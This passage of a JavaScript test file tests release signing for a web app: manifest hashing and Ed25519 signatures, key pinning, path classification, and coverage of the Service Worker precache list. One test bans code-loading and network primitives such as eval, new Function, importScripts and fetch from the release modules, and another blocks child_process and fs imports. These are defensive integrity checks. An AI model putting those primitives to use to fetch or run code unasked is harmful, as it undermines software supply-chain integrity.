  const running = await verifyRelease(installed.manifestText, await pinnedKey(store));
  assert.equal(running.ok, true);
  assert.equal((await verifyFileSet(SHELL(), running)).ok, true, 'the v1 shell still verifies');
  // and the v2 bytes are correctly refused by the v1 manifest — no silent creep
  assert.equal((await verifyFileSet(v2files, running)).ok, false);

  const offer = await describeOffer({ installedVersion: installed.version, offered: v2.text,
    pinnedKey: await pinnedKey(store) });
  assert.equal(offer.kind, 'update');
  assert.equal(await (await installedRelease(store)).version, '0.1.0', 'describing an offer installs nothing');
});

test('compareVersions orders releases the way humans expect, or says it cannot', () => {
  assert.equal(compareVersions('0.1.0', '0.2.0'), -1);
  assert.equal(compareVersions('1.10.0', '1.9.0'), 1);
  assert.equal(compareVersions('2.0.0', '2.0.0'), 0);
  assert.equal(compareVersions('0.2.0-rc.1', '0.2.0'), -1);
  assert.equal(compareVersions('0.2.0-rc.1', '0.2.0-rc.2'), -1);
  assert.equal(compareVersions('nightly', '0.2.0'), null);
  assert.equal(compareVersions('0.2', '0.2.0'), null);
});

test('nothing in the release modules can install, upgrade, fetch or store by itself', async () => {
  for (const rel of ['runtime/release/manifest.js', 'runtime/release/pin.js']) {
    const src = await readFile(repoPath(rel), 'utf8');
    const code = src.replace(/^\s*(\/\/.*)$/gm, '').replace(/\/\*[\s\S]*?\*\//g, '');
    for (const forbidden of ['node:', 'skipWaiting', 'caches.', 'indexedDB', 'localStorage',
      'importScripts', 'Date.now', 'Math.random', 'window.', 'document.', 'eval(', 'new Function']) {
      assert.equal(code.includes(forbidden), false, `${rel} must not contain ${forbidden}`);
    }
    // `fetch(` would mean this module can go and get code on its own
    assert.equal(/\bfetch\s*\(/.test(code), false, `${rel} must not fetch`);
    // manifest.js writes nothing at all; pin.js writes only via the injected store
    if (rel.endsWith('manifest.js')) assert.equal(/\.set\s*\(/.test(code), false, 'manifest.js must be read-only');
  }
  // `mandatory` is a literal false in the source. There is no path that sets it true.
  const src = await readFile(repoPath('runtime/release/manifest.js'), 'utf8');
  assert.equal(/mandatory:\s*true/.test(src), false);
});

// ---------------------------------------------------------------------------------------------
// 8. independence — this must run where there is no filesystem
// ---------------------------------------------------------------------------------------------

test('verification works with bytes only, in a context with no node:fs at all', async () => {
  // A Service Worker has no fs, no path, no process. Prove the modules do not need them by
  // running the whole flow in a child process that has `node:fs` blocked outright.
  const blocker = 'data:text/javascript,' + encodeURIComponent(`
    export async function resolve(spec, ctx, next) {
      if (spec.startsWith('node:') || ['fs', 'path', 'os', 'crypto', 'child_process',
          'buffer', 'process', 'util'].includes(spec)) {
        throw new Error('BLOCKED: ' + spec);
      }
      return next(spec, ctx);
    }`);
  const script = `
    import { register } from 'node:module';
    register(${JSON.stringify(blocker)});
    const { generateIdentity, exportPublicSsh } = await import(${JSON.stringify(repoPath('runtime/identity/ed25519.js'))});
    const { signPayload } = await import(${JSON.stringify(repoPath('runtime/identity/sshsig.js'))});
    const M = await import(${JSON.stringify(repoPath('runtime/release/manifest.js'))});
    const P = await import(${JSON.stringify(repoPath('runtime/release/pin.js'))});
    const enc = new TextEncoder();
    const files = new Map([['index.html', enc.encode('<!doctype html>')],
                           ['runtime/kernel.js', enc.encode('export const x = 1;')]]);
    const kp = await generateIdentity();
    const key = await exportPublicSsh(kp);
    const list = [];
    for (const [path, bytes] of files) list.push({ path, sha256: await M.sha256Hex(bytes), bytes: bytes.length });
    const m = { schema: 1, product: 'neodonkey', version: '0.1.0', key, files: list };
    m.signature = await signPayload(kp, M.canonicalManifestBytes(m), M.RELEASE_NAMESPACE);
    const res = await M.verifyRelease(JSON.stringify(m), key);
    if (!res.ok) throw new Error('verify failed: ' + res.reason);
    const set = await M.verifyFileSet(files, res);
    if (!set.ok) throw new Error('file set failed: ' + set.reason);
    const store = P.memoryStore();
    await P.pinKey(store, key);
    const gate = await P.gateRelease(store, JSON.stringify(m));
    if (gate.mode !== 'verified') throw new Error('gate: ' + gate.mode + ' ' + gate.reason);
    // and prove the blocker is real, not decorative
    let blocked = false;
    try { await import('node:fs'); } catch { blocked = true; }
    if (!blocked) throw new Error('the node: blocker did not work — this test proves nothing');
    console.log('NO-FS-OK');
  `;
  const out = execFileSync(process.execPath, ['--input-type=module', '--eval', script],
    { encoding: 'utf8', cwd: REPO });
  assert.match(out, /NO-FS-OK/);
});

// ---------------------------------------------------------------------------------------------
// 9. the real repository — the rules, the CLI, and the coupling to the precache list
// ---------------------------------------------------------------------------------------------

test('classifyPath: the release scope is rules, and unknown files ABORT rather than slip through', () => {
  const included = ['index.html', 'manifest.webmanifest', 'service-worker.js',
    'runtime/kernel.js', 'runtime/ui/style.css', 'runtime/ui/icon.svg', 'runtime/git/fs-node.js'];
  for (const p of included) assert.equal(classifyPath(p).include, true, `${p} should ship`);

  const excluded = {
    '.DS_Store': 'dotfile', 'runtime/.DS_Store': 'dotfile', '.git/config': 'dotfile',
    'package.json': 'root-excluded', 'serve.mjs': 'root-excluded', 'release.json': 'root-excluded',
    'README.md': 'root-markdown', 'neodonkey-manifesto.md': 'root-markdown',
    'test/h-release.test.js': 'excluded-tree:test', 'docs/CONTRACT.md': 'excluded-tree:docs',
    'demo/sarah.mjs': 'excluded-tree:demo', 'mcp/server.mjs': 'excluded-tree:mcp',
    'release/sign-release.mjs': 'excluded-tree:release',
    'operating-model/processes/goods-receipt.md': 'excluded-tree:operating-model',
    'templates/d2c-retail-europe/README.md': 'excluded-tree:templates',
    'keys/release.jwk': 'excluded-tree:keys',
    'runtime/polism/grammar.md': 'runtime-acknowledged-exclusion',
  };
  for (const [p, rule] of Object.entries(excluded)) {
    const c = classifyPath(p);
    assert.equal(c.include, false, `${p} must not ship`);
    assert.equal(c.rule, rule, p);
  }

  // The important bucket: a new *kind* of file is neither shipped nor silently dropped.
  for (const p of ['runtime/ui/config.json', 'runtime/core.wasm', 'runtime/ui/font.woff2',
    'vendor/lib.js', 'index.php', 'sw-v2.js']) {
    assert.equal(classifyPath(p).rule, 'unclassified',
      `${p} must force an explicit decision, not be quietly excluded`);
  }
  assert.equal(classifyPath('').rule, 'unclassified');
});

test('signing the real repository produces a manifest that verifies — ours and OpenSSH\'s', async () => {
  let dir;
  try {
    dir = await mkdtemp(join(tmpdir(), 'nd-rel-'));
    const keyPath = join(dir, 'release.jwk');
    const outPath = join(dir, 'release.json');
    const cli = repoPath('release/sign-release.mjs');

    execFileSync(process.execPath, [cli, '--generate', keyPath, '--comment', 'release@neodonkey.eu'],
      { encoding: 'utf8' });
    const signOut = execFileSync(process.execPath,
      [cli, '--key', keyPath, '--version', '0.1.0', '--out', outPath], { encoding: 'utf8' });
    assert.match(signOut, /ssh-keygen -Y verify: OK/);

    const text = await readFile(outPath, 'utf8');
    const keyLine = /^ {2}signed by {4}(.+)$/m.exec(signOut)[1];
    const res = await verifyRelease(text, keyLine);
    assert.equal(res.ok, true, res.reason);

    // the real files on disk hash to what the manifest says
    for (const path of ['index.html', 'runtime/kernel.js', 'runtime/release/manifest.js',
      'service-worker.js']) {
      const buf = await readFile(repoPath(path));
      assert.equal(await verifyFile(path, new Uint8Array(buf), res), true, path);
    }
    // and one byte of drift is caught
    const buf = await readFile(repoPath('runtime/kernel.js'));
    const mutated = new Uint8Array(buf); mutated[mutated.length - 1] ^= 0x01;
    assert.equal(await verifyFile('runtime/kernel.js', mutated, res), false);

    // --check re-verifies from the outside, with ssh-keygen as the second opinion
    const check = execFileSync(process.execPath, [cli, '--check', outPath, '--pubkey', keyLine],
      { encoding: 'utf8' });
    assert.match(check, /^OK {2}version 0\.1\.0/m);

    // the CLI refuses --generate over an existing file (a key you overwrite is a key you lose)
    assert.throws(() => execFileSync(process.execPath, [cli, '--generate', keyPath], { stdio: 'pipe' }));
  } finally { if (dir) await rm(dir, { recursive: true, force: true }); }
});

test('the repository as it stands contains no unclassified file', async () => {
  const { files, unclassified } = await collectReleaseFiles(REPO);
  assert.deepEqual(unclassified, [], 'decide about these in release/sign-release.mjs');
  assert.ok(files.length > 20, `expected a real runtime, got ${files.length} files`);
  assert.ok(files.some((f) => f.path === 'service-worker.js'));
  assert.ok(files.every((f) => /^[0-9a-f]{64}$/.test(f.sha256)));
  assert.ok(!files.some((f) => f.path.includes('release.json')), 'a manifest cannot hash itself');
  assert.ok(!files.some((f) => f.path.startsWith('test/')));
});

test('everything the Service Worker precaches is inside the signed manifest', async () => {
  // The coupling that matters: a file the worker fetches and executes but that no manifest
  // covers is a hole, however good the signature on everything else is. If this fails after a
  // change to the shell list, the fix is a rule in release/sign-release.mjs — not a smaller test.
  const sw = await readFile(repoPath('service-worker.js'), 'utf8');
  const listed = /const SHELL = \[([\s\S]*?)\];/.exec(sw);
  assert.ok(listed, 'service-worker.js must declare a SHELL array');
  const shell = [...listed[1].matchAll(/'([^']+)'/g)].map((m) => m[1])
    .filter((p) => p !== './');                                   // './' is index.html, already listed
  const { files } = await collectReleaseFiles(REPO);
  const covered = new Set(files.map((f) => f.path));
  const uncovered = shell.filter((p) => !covered.has(p));
  assert.deepEqual(uncovered, [],
    'these are precached and executed but not covered by a release signature');
});

test('a fresh generated release key is usable and its JWK is not the public key', async () => {
  const kp = await generateIdentity({ comment: 'release@neodonkey.eu' });
  const jwk = await exportPrivateJwk(kp);
  assert.equal(jwk.kty, 'OKP');
  assert.equal(jwk.crv, 'Ed25519');
  assert.equal(typeof jwk.d, 'string', 'the private scalar is what makes this a signing key');
  const line = await exportPublicSsh(kp);
  assert.equal(line.includes(jwk.d), false, 'the public line must not contain the private scalar');
  const { manifest } = await release(SHELL(), { kp, key: line });
  assert.equal((await verifyRelease(manifest, line)).ok, true);
});
